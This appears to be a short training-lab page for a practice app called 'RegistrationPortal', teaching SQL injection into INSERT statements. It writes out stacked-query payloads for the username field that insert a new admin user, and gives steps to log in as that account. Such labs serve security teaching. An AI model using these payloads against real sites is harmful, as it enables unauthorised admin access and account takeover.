SQL Injection in INSERT

Welcome to RegistrationPortal. Test for SQL injection vulnerabilities.

Objective

Inject into INSERT statements

INSERT statements can be vulnerable too. The query might be: INSERT INTO users (username, email) VALUES ('INPUT', 'INPUT'). You can inject additional columns or values.

Try: test', 'test@test.com'); INSERT INTO users (username, password, role) VALUES ('hacker', 'pass', 'admin')-- to inject a new admin user.

Step-by-step:
  1. In username field: test', 'test@test.com'); INSERT INTO users VALUES ('admin', 'password', 'admin')--
  2. Complete registration
  3. Login as the newly created admin user
Why it works: Multiple statements execute, creating your malicious user.
